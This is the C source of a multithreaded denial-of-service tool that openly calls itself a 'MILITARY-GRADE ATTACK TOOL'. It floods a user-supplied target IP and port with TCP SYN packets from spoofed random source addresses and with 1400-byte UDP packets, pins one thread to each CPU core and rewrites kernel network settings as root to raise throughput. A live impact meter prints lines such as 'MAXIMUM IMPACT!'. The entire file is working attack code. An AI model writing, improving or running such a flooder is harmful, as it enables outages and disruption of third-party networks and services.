#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>

#define CPU_CORES 16
#define PACKETS_PER_BURST 50000
#define TARGET_PPS 850000
#define BATCH_SIZE 1000

/* Lock-free atomic counters */
volatile long long total_packets = 0;
volatile long long total_bytes = 0;
volatile int attack_running = 1;

/* Pre-allocated packet buffers */
char* packet_buffer;
int packet_sizes[10];

/* CPU affinity for threads */
cpu_set_t cpu_sets[CPU_CORES];

typedef struct {
    int core_id;
    char target_ip[16];
    int target_port;
    long long packets_sent;
    long long bytes_sent;
    int raw_sock;
    int udp_sock;
} core_data_t;

/* IP header structure */
struct iphdr_custom {
    unsigned char  ihl:4, version:4;
    unsigned char  tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short check;
    unsigned int   saddr;
    unsigned int   daddr;
};

/* TCP header structure */
struct tcphdr_custom {
    unsigned short source;
    unsigned short dest;
    unsigned int   seq;
    unsigned int   ack_seq;
    unsigned short res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    unsigned short window;
    unsigned short check;
    unsigned short urg_ptr;
};

/* UDP header structure */
struct udphdr_custom {
    unsigned short source;
    unsigned short dest;
    unsigned short len;
    unsigned short check;
};

/* Fast checksum calculation */
unsigned short checksum(void* b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    result = ~sum;
    return result;
}

/* Initialize packet templates */
void init_packet_templates(const char* target_ip, int target_port) {
    /* Allocate huge page for packet buffer */
    packet_buffer = mmap(NULL, 1024 * 1024, PROT_READ | PROT_WRITE, 
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    
    if (packet_buffer == MAP_FAILED) {
        packet_buffer = malloc(1024 * 1024); /* Fallback to regular malloc */
    }

    /* Pre-build 10 different packet templates */
    for (int i = 0; i < 10; i++) {
        char* packet = packet_buffer + (i * 1024);
        
        struct iphdr_custom* ip = (struct iphdr_custom*)packet;
        struct tcphdr_custom* tcp = (struct tcphdr_custom*)(packet + sizeof(struct iphdr_custom));
        
        /* IP Header */
        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr_custom) + sizeof(struct tcphdr_custom));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand(); /* Random source IP */
        inet_pton(AF_INET, target_ip, &ip->daddr);
        
        /* TCP Header */
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(target_port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->res1 = 0;
        tcp->doff = 5;
        tcp->fin = 0;
        tcp->syn = 1; /* SYN flag */
        tcp->rst = 0;
        tcp->psh = 0;
        tcp->ack = 0;
        tcp->urg = 0;
        tcp->ece = 0;
        tcp->cwr = 0;
        tcp->window = htons(8192);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        /* Calculate checksums */
        ip->check = checksum(ip, sizeof(struct iphdr_custom));
        
        packet_sizes[i] = sizeof(struct iphdr_custom) + sizeof(struct tcphdr_custom);
    }
}

/* Ultra high-speed packet sender per CPU core */
void* core_attack_thread(void* arg) {
    core_data_t* data = (core_data_t*)arg;
    
    /* Set CPU affinity */
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpu_sets[data->core_id]);
    
    /* Set high priority */
    struct sched_param param;
    param.sched_priority = 99;
    sched_setscheduler(0, SCHED_FIFO, &param);
    
    printf("🔥 Core %d: Starting ultra high-speed attack\n", data->core_id);
    
    /* Create optimized raw socket */
    data->raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (data->raw_sock < 0) {
        printf("❌ Core %d: Cannot create raw socket\n", data->core_id);
        return NULL;
    }
    
    int one = 1;
    setsockopt(data->raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    /* Set socket buffer sizes */
    int buffer_size = 1024 * 1024; /* 1MB buffer */
    setsockopt(data->raw_sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    /* Create UDP socket for mixed attack */
    data->udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    setsockopt(data->udp_sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    // Batch send arrays
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    memset(msgs, 0, sizeof(msgs));
    
    // Pre-setup batch structures
    for (int i = 0; i < BATCH_SIZE; i++) {
        iovecs[i].iov_base = packet_buffer + ((i % 10) * 1024);
        iovecs[i].iov_len = packet_sizes[i % 10];
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(target_addr);
    }
    
    // UDP payload
    char udp_payload[1400];
    memset(udp_payload, 'X', sizeof(udp_payload));
    
    printf("✅ Core %d: Ready for maximum throughput\n", data->core_id);
    
    while (attack_running) {
        // Burst 1: Raw TCP SYN flood (batch send)
        int sent = sendmmsg(data->raw_sock, msgs, BATCH_SIZE, MSG_DONTWAIT);
        if (sent > 0) {
            data->packets_sent += sent;
            data->bytes_sent += sent * 40; // Average packet size
            __sync_fetch_and_add(&total_packets, sent);
            __sync_fetch_and_add(&total_bytes, sent * 40);
        }
        
        // Burst 2: UDP flood
        for (int i = 0; i < BATCH_SIZE; i++) {
            int udp_sent = sendto(data->udp_sock, udp_payload, sizeof(udp_payload), 
                                 MSG_DONTWAIT, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (udp_sent > 0) {
                data->packets_sent++;
                data->bytes_sent += udp_sent;
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, udp_sent);
            }
        }
        
        // Randomize source IPs in packets
        for (int i = 0; i < 10; i++) {
            struct iphdr_custom* ip = (struct iphdr_custom*)(packet_buffer + (i * 1024));
            struct tcphdr_custom* tcp = (struct tcphdr_custom*)(packet_buffer + (i * 1024) + sizeof(struct iphdr_custom));
            
            ip->saddr = rand();
            ip->id = htons(rand() % 65535);
            tcp->source = htons(rand() % 65535);
            tcp->seq = rand();
            
            // Recalculate checksums quickly (simplified)
            ip->check = 0;
            ip->check = checksum(ip, sizeof(struct iphdr_custom));
        }
    }
    
    close(data->raw_sock);
    close(data->udp_sock);
    return NULL;
}

// Optimized statistics thread
void* stats_thread(void* arg) {
    time_t start_time = time(NULL);
    long long last_packets = 0;
    
    while (attack_running) {
        usleep(500000); // Update every 0.5 seconds for better responsiveness
        
        time_t current_time = time(NULL);
        int elapsed = current_time - start_time;
        
        long long current_packets = total_packets;
        long long current_bytes = total_bytes;
        
        long long pps = (current_packets - last_packets) * 2; // *2 because we sample every 0.5s
        float avg_pps = elapsed > 0 ? (float)current_packets / elapsed : 0;
        float mbps = (float)(current_bytes - total_bytes) * 2 / 1024 / 1024; // MB/s
        
        printf("\r🔥 PPS: %7lld | Avg: %8.0f | Total: %10lld | %.1fMB/s | %ds", 
               pps, avg_pps, current_packets, mbps, elapsed);
        fflush(stdout);
        
        // Performance indicator
        if (pps >= TARGET_PPS * 0.9) {
            printf(" ✅ MAXIMUM IMPACT!");
        } else if (pps >= TARGET_PPS * 0.7) {
            printf(" ⚡ HIGH IMPACT");
        } else if (pps >= TARGET_PPS * 0.4) {
            printf(" 📈 GOOD IMPACT");
        } else {
            printf(" 🚀 RAMPING UP");
        }
        
        last_packets = current_packets;
    }
    
    return NULL;
}

void signal_handler(int sig) {
    printf("\n\n🛑 Stopping ultra high-performance attack...\n");
    attack_running = 0;
}

// System optimization
void optimize_system() {
    printf("🔧 Applying system optimizations...\n");
    
    // Network optimizations
    system("echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null");
    system("echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null");
    system("echo 16777216 > /proc/sys/net/core/rmem_default 2>/dev/null");
    system("echo 16777216 > /proc/sys/net/core/wmem_default 2>/dev/null");
    system("echo 32768 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null");
    system("echo 1000000 > /proc/sys/net/core/netdev_budget 2>/dev/null");
    
    // TCP optimizations
    system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null");
    system("echo 1 > /proc/sys/net/ipv4/tcp_tw_recycle 2>/dev/null");
    system("echo 0 > /proc/sys/net/ipv4/tcp_timestamps 2>/dev/null");
    
    // File descriptor limits
    system("echo 1048576 > /proc/sys/fs/file-max 2>/dev/null");
    
    printf("✅ System optimization completed\n");
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80\n", argv[0]);
        return 1;
    }
    
    if (getuid() != 0) {
        printf("❌ This tool requires root privileges for maximum performance!\n");
        printf("   Run with: sudo %s %s %s\n", argv[0], argv[1], argv[2]);
        return 1;
    }
    
    char target_ip[16];
    int target_port = atoi(argv[2]);
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    
    printf("🚀 ULTRA HIGH-PERFORMANCE DDoS TOOL\n");
    printf("🎯 Target: %s:%d\n", target_ip, target_port);
    printf("⚡ Target PPS: %d\n", TARGET_PPS);
    printf("🧠 CPU Cores: %d\n", CPU_CORES);
    printf("⚠️  MILITARY-GRADE ATTACK TOOL!\n\n");
    
    // System optimization
    optimize_system();
    
    // Initialize CPU affinity sets
    for (int i = 0; i < CPU_CORES; i++) {
        CPU_ZERO(&cpu_sets[i]);
        CPU_SET(i, &cpu_sets[i]);
    }
    
    // Initialize packet templates
    printf("🔧 Initializing packet templates...\n");
    init_packet_templates(target_ip, target_port);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL));
    
    // Create one thread per CPU core for maximum efficiency
    pthread_t threads[CPU_CORES];
    core_data_t core_data[CPU_CORES];
    
    for (int i = 0; i < CPU_CORES; i++) {
        core_data[i].core_id = i;
        strcpy(core_data[i].target_ip, target_ip);
        core_data[i].target_port = target_port;
        core_data[i].packets_sent = 0;
        core_data[i].bytes_sent = 0;
        
        if (pthread_create(&threads[i], NULL, core_attack_thread, &core_data[i]) != 0) {
            printf("❌ Failed to create thread for core %d\n", i);
        }
    }
    
    // Statistics thread
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    printf("🔥 ULTRA HIGH-PERFORMANCE ATTACK LAUNCHED!\n");
    printf("📊 %d CPU cores engaged\n", CPU_CORES);
    printf("🎯 Target: %d PPS\n", TARGET_PPS);
    printf("Press Ctrl+C to stop\n\n");
    
    // Wait for all threads
    for (int i = 0; i < CPU_CORES; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(stats_tid, NULL);
    
    // Final statistics
    printf("\n\n✅ ATTACK COMPLETED\n");
    printf("📊 Total packets: %lld\n", total_packets);
    printf("📊 Total data: %.2f GB\n", (float)total_bytes / 1024 / 1024 / 1024);
    printf("⚡ Peak performance achieved!\n");
    
    // Cleanup
    if (packet_buffer != MAP_FAILED) {
        munmap(packet_buffer, 1024 * 1024);
    } else {
        free(packet_buffer);
    }
    
    return 0;
}
